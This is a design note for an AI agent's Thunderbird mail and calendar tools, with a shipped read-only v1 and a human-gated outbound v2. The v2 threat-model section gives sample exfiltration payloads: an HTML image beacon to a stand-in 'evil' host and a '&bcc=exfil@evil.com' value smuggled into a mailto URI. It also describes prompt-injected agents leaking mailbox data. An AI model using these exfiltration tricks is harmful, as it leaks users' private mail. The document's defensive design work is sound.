# Local Thunderbird integration

Status: **v1 shipped; v2 (egress) in flight.** The `pikuri-thunderbird` gem
ships the four inbound, no-egress tools (`thunderbird_mail_search` /
`_mail_read` / `_calendar_search` / `_calendar_read`) + profile discovery +
the snapshot / ephemeral-FTS5 machinery + a one-call `Thunderbird::Extension`
+ `bin/pikuri-thunderbird`, all under test.

This note has been trimmed per the graduation pipeline
([`../CLAUDE.md`](../CLAUDE.md)). Where the substance now lives:

- **Empirical data** (confirmed Gloda/calendar schema, encodings, locking,
  snap confinement, hand-off mechanics, the measured numbers) →
  `pikuri-thunderbird/DESIGN.md` § "Storage landscape (empirically
  confirmed)" — the durable evidence base, especially for the v2 builder.
- **Per-symbol rationale** → the class yardocs ({Pikuri::Thunderbird::Profile},
  {Snapshot}, {Gloda}, {Calendar}, the four tools, {Extension}).
- **Invariants** → CLAUDE.md (the gem inventory + the *Thunderbird
  no-egress / no-send seam*).

What remains here: the origin map, the still-in-flight **v2 egress design**,
and the open validation questions. When v2 ships, its design graduates the
same way and this note shrinks again.

## Related

- [`os-assistant.md`](os-assistant.md) — the shipped analog: an offline,
  desktop-specific agent over an `available?`-probed backend that never
  egresses. pikuri-thunderbird mirrors the *pattern* (not the
  GNOME-dependence) but is its own gem.
- [`trifecta-detector.md`](trifecta-detector.md) — email is the textbook
  trifecta: private mailbox + attacker-authorable content + egress. v1
  removes the egress leg entirely; v2 must keep it human-gated.
- [`private-context-taint.md`](private-context-taint.md) +
  [`more-confirmers.md`](more-confirmers.md) — the "human as *author*, not
  *approver*" seat that the v2 compose hand-off relies on.

## v1 — shipped (search-only, no egress)

The 13 original design questions are all decided; the reasoning graduated to
the homes above. Origin map (question → where the answer now lives):

- **Q1 search backend** → Gloda-only, our own ephemeral FTS5 over the decoded
  columns (mozporter/fts3 unusable; family-B mbox parse deferred as the
  `available?` fallback). {Gloda} + DESIGN.md.
- **Q2 placement** → a separate `pikuri-thunderbird` gem (its own threat
  model; untrusted-parser deps out of the audit-first `pikuri-os`). Shipped.
- **Q3 discovery** → never-guess (snap/apt roots, raise on ambiguity, `nil`
  when absent, `profile_dir:` override). {Profile}.
- **Q4 format coverage** → Gloda-only in v1; no mbox/maildir/Mork reader. {Gloda}.
- **Q5 attachments** → names only (Gloda's `attachmentNames`); bodies deferred
  with the mbox parser. {MailSearch}/{MailRead}.
- **Q6 calendar read** → plain `SELECT` on normalized columns; PRTime µs UTC,
  all-day = `flags` bit 8; empty-corpus self-explains (enable Offline
  Support). {Calendar} + DESIGN.md.
- **Q11 concurrency** → never query the live locked DB; a bracketed on-disk
  reflink snapshot copy (change-counter + `-journal` bracket). {Snapshot} +
  DESIGN.md. (The `:memory:` medium was considered and reversed — on-disk keeps
  idle RAM ≈ 0 via the page cache; `:memory:` stays a documented zero-disk
  knob, unbuilt.)
- **Q12 freshness** → inherit Gloda's (TB keeps it live); per-search
  change-counter check triggers the ~1 s FTS5 rebuild, no daemon. {Gloda} +
  DESIGN.md.
- **Q13 tool surface** → four inbound tools named `thunderbird_*`; mail ORs
  words + bm25-ranks (recall-first), calendar ANDs words across
  title/description/location (precision-first, no ranker). The shipped tools.

## v2 — outbound, human-gated (designed, not built)

The egress half. The load-bearing invariant (now also the CLAUDE.md seam):
**pikuri performs no network egress and no autonomous send; every outbound
action is a hand-off to Thunderbird's own UI where the human commits.** No
send tool ever ships. Confirmed hand-off mechanics are in DESIGN.md §
"Hand-off mechanics"; the *design* on top of them:

### `thunderbird_mail_compose` — hand off a pre-filled draft

- **Transport = a `mailto:` URI** (decided; `-compose` can't do multiline —
  see DESIGN.md). Opens a pre-filled compose window in the running instance;
  the human reviews and clicks Send.
- **Plain-text body only, no HTML.** Load-bearing, not cosmetic: HTML gives a
  poisoned agent two exfil vectors plain text lacks — hidden content
  (white-on-white / `display:none`) that survives the human's visual review,
  and remote beacons (`<img src=http://evil/?leak=…>`) that fire on open and
  ship to an *arbitrary host*, punching through the "the body only goes to the
  intended recipient" premise. Plain text: what the human sees is what sends.
- **Injection defense — percent-encode every field value.** Because the
  transport is a URI, a naive concat lets an attacker-authored body smuggle
  `&bcc=exfil@evil.com`. Encoding each value (so `&`/`?`/`=`/`#`/`%`/newline →
  `%XX`) structurally closes that; runs *after* the recipient guard below.
- **Body pre-fill = full, useful body** (decided). The forced-authorship seat
  binds to the **recipient + intent-to-send**, not the prose: content-drafting
  is the agent's job, destination-authorship is the human's. Safe *given the
  recipient guard* because "the recipient is the attack" — a leaked body goes
  to the legitimately-intended recipient, a weak channel by construction. A
  directed pre-send checklist observation ("before Send: confirm the recipient;
  the body carries nothing you wouldn't want them to see") re-instills the
  audit mindset without crippling the draft.
  - *Rejected:* bullet-skeleton pre-fill (theater — unenforceable, doesn't
    close body-exfil, worse draft); subject-only/empty body (guts the feature).
- **Binary** = `thunderbird` on PATH, with a `thunderbird_bin:` override
  mirroring Q3's `profile_dir:`.
- **Attachments** deferred to a later pass (the author-not-approver draft
  doesn't need them, and a path/URL reopens the staging problem).

### `thunderbird_calendar_create` — hand off an `.ics` to import

- **Decided: hand TB an `.ics`** (`thunderbird <path.ics>` → the human-gated
  import wizard; TB owns the commit *and* the human picks the destination
  calendar, i.e. local-vs-CalDAV = no-egress-vs-egress is the human's choice).
  *Rejected:* direct DB write (TB holds the DBs `EXCLUSIVE`; a live write is
  invisible/clobberable and never syncs).
- **Staging the `.ics`** (decided by the snap-confinement probe, DESIGN.md):
  stage under the discovered variant's own readable root — snap →
  `~/snap/thunderbird/common/…`, apt → the (unconfined) profile root; **not**
  the hidden `~/.cache` snapshot dir. Finalizer-reap after hand-off.

### The recipient guard (Q10) — machine covers the invisible, human the visible

The compose ceremony is a strong human barrier on the **recipient** and gross
content, but soft on subtle body-exfil and look-alike domains. The mechanical
outbound guard (deterministic, never an AI verdict), in two tiers:

- **Hard reject → omit the field + force retype:**
  - Everywhere (subject/body/address): route through {Pikuri::Sanitizer}
    (control bytes, bidi, zero-width, mixed-script welds like `Pаypal`). On a
    **body** flag, **fail closed** — error and hand off nothing (an
    agent-authored outbound body has no honest reason to carry those; degrade
    to the human retyping in TB). Scope to validate at build: emoji, accents,
    RTL letters must pass; only bidi override/isolate, zero-width, C0/C1
    controls trip it.
  - Address fields only: **ASCII-only** (kills Latin-diacritic look-alikes
    like `@mícrosoft.com` that Sanitizer's script-mix check misses) **+ reject
    `xn--` punycode** (a pre-encoded homoglyph domain is pure ASCII and would
    otherwise pass). Tolerable false-positives (rare IDN recipients) because
    the fallback is "type it in TB."
- **Soft warn → keep, but raise scrutiny:** the **correspondence-graph
  novelty flag** — for each recipient domain, ask Gloda's `contacts`/
  `identities` graph "has the user ever exchanged mail with this domain?"
  (both directions; Sent is indexed). A never-seen domain (`paypa1.com` when
  you've mailed `paypal.com` 100×) gets a loud observation urging out-of-band
  verification, but stays in the pre-fill — a hard reject here would fire on
  every genuinely-new correspondent and burn to fatigue. Degrades cleanly off
  Gloda (mbox fallback → skip + say so).
- **Honest residual:** pure-ASCII look-alikes of a domain you've *never* used,
  thin-history mailboxes, and a human who waves the warning through. That's why
  the observation urges a human-driven out-of-band browser check — the last
  line, outside the agent's trust boundary (adds no egress leg).

### `thunderbird_*` trifecta detector wiring (when compose is added)

When compose *is* wired, the (still-unbuilt) trifecta detector should tag
compose/create-event `:egress` and mail-read `:untrusted`+`:private`, so a
combined-legs wiring trips the all-three warning correctly. Document the
posture honestly as smoke-alarm-grade (human-gated ≠ severed), not a firewall.

## Open validation questions

Need a real populated install or future work; none blocks v1.

- **Real-install smoke test.** v1 is tested only against synthetic fixtures
  built to the confirmed schema (no TB on the dev box). First run against a
  real profile is the true test of the external-content FTS5 rebuild + column
  assumptions.
- **Calendar WAL cadence.** A WAL DB's change counter bumps only on
  checkpoint, so the calendar staleness signal should eventually pair the
  counter with `-wal` size+mtime. v1 uses the bare counter; deferred until the
  calendar path is exercised heavily.
- **Gloda counter cadence across a real poll** — sizing only (retry/backoff);
  the read/star/tag churn is already confirmed. The content-triple de-churn
  (`max(id)`/`count(*)`/`sum(deleted)`) is the upgrade if the ~1 s spurious
  rebuild ever bites.
- **`CAL_ITEM_FLAG` mapping** — verify the recalled bitfield (esp. beyond
  bit 8) against comm-central at v2-calendar-create implementation.
- **v2 residual — does importing an `.ics` with `ATTENDEE` lines onto a
  CalDAV calendar mail invites?** Import usually isn't an organize-action, so
  probably not — but unverified; the `attendees` param waits on this.
- **`.msf` (Mork), maildir, mbox fallback** — all deferred; build only when a
  Gloda-disabled or maildir host is a real user.
